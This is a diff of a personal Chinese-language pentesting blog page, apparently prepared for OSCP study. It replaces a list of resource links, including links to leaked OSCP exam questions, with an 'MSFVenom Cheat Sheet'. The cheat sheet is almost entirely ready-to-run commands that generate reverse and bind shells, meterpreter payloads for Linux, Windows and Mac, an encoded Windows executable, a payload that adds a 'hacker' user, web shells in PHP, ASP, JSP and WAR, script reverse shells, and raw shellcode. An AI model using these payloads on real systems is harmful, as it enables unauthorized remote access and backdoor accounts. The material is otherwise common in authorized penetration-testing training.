@@ -11,7 +11,7 @@
 
     <title>
         
-          Resources - 阿毛毛の坑
+          MSFVenom - 阿毛毛の坑
         
     </title>
 
@@ -186,33 +186,63 @@ function sidebar_toggle() {
         </div>
         <div class="book-content">
           <div class="book-post">
-  <h1 id="学习资料">学习资料</h1>
-<p>在考试准备的过程中发现的一些宝贵资料，也是日常工作中长期可用的参考。</p>
-<h3 id="Enumeration">Enumeration</h3>
-<p><a target="_blank" rel="noopener" href="http://www.0daysecurity.com/penetration-testing/enumeration.html">http://www.0daysecurity.com/penetration-testing/enumeration.html</a><br>
-<a target="_blank" rel="noopener" href="https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</a><br>
-<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=Hk-21p2m8YY">https://www.youtube.com/watch?v=Hk-21p2m8YY</a></p>
-<h3 id="Shell-Exploitation">Shell Exploitation</h3>
-<p><a target="_blank" rel="noopener" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br>
-<a target="_blank" rel="noopener" href="https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/">https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/</a><br>
-<a target="_blank" rel="noopener" href="http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/">http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</a><br>
-<a target="_blank" rel="noopener" href="https://netsec.ws/?p=331">https://netsec.ws/?p=331</a></p>
-<h3 id="Windows-Privilege-Escalation">Windows Privilege Escalation</h3>
-<p><a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a><br>
-<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=kMG8IsCohHA">https://www.youtube.com/watch?v=kMG8IsCohHA</a><br>
-<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=PC_iMqiuIRQ">https://www.youtube.com/watch?v=PC_iMqiuIRQ</a><br>
-<a target="_blank" rel="noopener" href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p>
-<h3 id="Linux-Privilege-Escalation">Linux Privilege Escalation</h3>
-<p><a target="_blank" rel="noopener" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a><br>
-<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=dk2wsyFiosg">https://www.youtube.com/watch?v=dk2wsyFiosg</a></p>
-<h3 id="Privilege-escalation-recon-scripts">Privilege escalation recon scripts:</h3>
-<p><a target="_blank" rel="noopener" href="http://www.securitysift.com/download/linuxprivchecker.py">http://www.securitysift.com/download/linuxprivchecker.py</a><br>
-<a target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a></p>
-<h3 id="OSCP-前辈总结的一些备考指南">OSCP 前辈总结的一些备考指南</h3>
-<p><a target="_blank" rel="noopener" href="https://www.moondream.cn/?p=1775">https://www.moondream.cn/?p=1775</a><br>
-<a target="_blank" rel="noopener" href="https://whale3070.github.io/experience/2019/11/22/06-x/">https://whale3070.github.io/experience/2019/11/22/06-x/</a><br>
-真题：<a target="_blank" rel="noopener" href="https://whale3070.github.io/oscp/2019/12/06/02-x/">https://whale3070.github.io/oscp/2019/12/06/02-x/</a><br>
-真题2：<a target="_blank" rel="noopener" href="https://whale3070.github.io/reference/2019/12/03/OSCP%E7%9C%9F%E9%A2%98%E6%B3%84%E9%9C%B2/">https://whale3070.github.io/reference/2019/12/03/OSCP真题泄露/</a></p>
+  <h1 id="MSFVenom-Cheat-Sheet">MSFVenom Cheat Sheet</h1>
+<h3 id="Metasploit-Handler">Metasploit Handler</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler
+<span class="token builtin class-name">set</span> PAYLOAD <span class="token operator">&lt;</span>Payload name<span class="token operator">></span>
+<span class="token builtin class-name">set</span> RHOST <span class="token operator">&lt;</span>Remote IP<span class="token operator">></span>
+<span class="token builtin class-name">set</span> LHOST <span class="token operator">&lt;</span>Local IP<span class="token operator">></span>
+<span class="token builtin class-name">set</span> LPORT <span class="token operator">&lt;</span>Local Port<span class="token operator">></span>
+run</code></pre>
+<h2 id="0x01-Binaries-Payloads">0x01 Binaries Payloads</h2>
+<h3 id="1、Linux">1、Linux</h3>
+<p>Linux Meterpreter Reverse Shell<br>
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f elf &gt; shell.elf</p>
+<p>Linux Bind Meterpreter Shell<br>
+msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf &gt; bind.elf</p>
+<p>Linux Bind Shell<br>
+msfvenom -p generic/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f elf &gt; term.elf</p>
+<h3 id="2、Windows">2、Windows</h3>
+<p>Windows Meterpreter Reverse TCP Shell<br>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe &gt; shell.exe</p>
+<p>Windows Reverse TCP Shell<br>
+msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe &gt; shell.exe</p>
+<p>Windows Encoded Meterpreter Windows Reverse Shell<br>
+msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe &gt; encoded.exe</p>
+<p>Windows Create User<br>
+msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe &gt; adduser.exe</p>
+<h3 id="3、Mac">3、Mac</h3>
+<p>Mac Reverse Shell<br>
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f macho &gt; shell.macho</p>
+<p>Mac Bind Shell<br>
+msfvenom -p osx/x86/shell_bind_tcp RHOST=<Remote IP Address> LPORT=<Local Port> -f macho &gt; bind.macho</p>
+<h2 id="0x02-Web-Payloads">0x02 Web Payloads</h2>
+<p>PHP Meterpreter Reverse TCP<br>
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw &gt; shell.php<br>
+cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</p>
+<p>ASP Meterpreter Reverse TCP<br>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f asp &gt; shell.asp</p>
+<p>JSP Java Meterpreter Reverse TCP<br>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw &gt; shell.jsp</p>
+<p>WAR<br>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war &gt; shell.war</p>
+<h2 id="0x03-Scripting-Payloads">0x03 Scripting Payloads</h2>
+<p>Python Reverse Shell<br>
+msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw &gt; <a target="_blank" rel="noopener" href="http://shell.py">shell.py</a></p>
+<p>Bash Unix Reverse Shell<br>
+msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw &gt; <a target="_blank" rel="noopener" href="http://shell.sh">shell.sh</a></p>
+<p>Perl Unix Reverse shell<br>
+msfvenom -p cmd/unix/reverse_perl LHOST=<Local IP Address> LPORT=<Local Port> -f raw &gt; <a target="_blank" rel="noopener" href="http://shell.pl">shell.pl</a></p>
+<h2 id="0x04-Shellcode">0x04 Shellcode</h2>
+<h3 id="1、Linux-v2">1、Linux</h3>
+<p>Linux Meterpreter Reverse TCP Shellcode<br>
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language></p>
+<h3 id="2、Windows-v2">2、Windows</h3>
+<p>Windows Meterpreter Reverse TCP Shellcode<br>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language></p>
+<h3 id="3、Mac-v2">3、Mac</h3>
+<p>Mac Reverse TCP Shellcode<br>
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language></p>
 
 </div>
 
@@ -250,7 +280,7 @@ function sidebar_toggle() {
     <!-- Author title -->
     <div class="author-title">
       <div>amm907</div>
-      <div>2020-11-26</div>
+      <div>2020-12-15</div>
     </div>
   </div>
 
@@ -258,7 +288,7 @@ function sidebar_toggle() {
     <div class="divider"></div>
 
     <div class="link">
-      <a class="category-link" href="/categories/OSCP/">OSCP</a>
+      <a class="category-link" href="/categories/WEAPONRY/">WEAPONRY</a>
 
       
     </div>
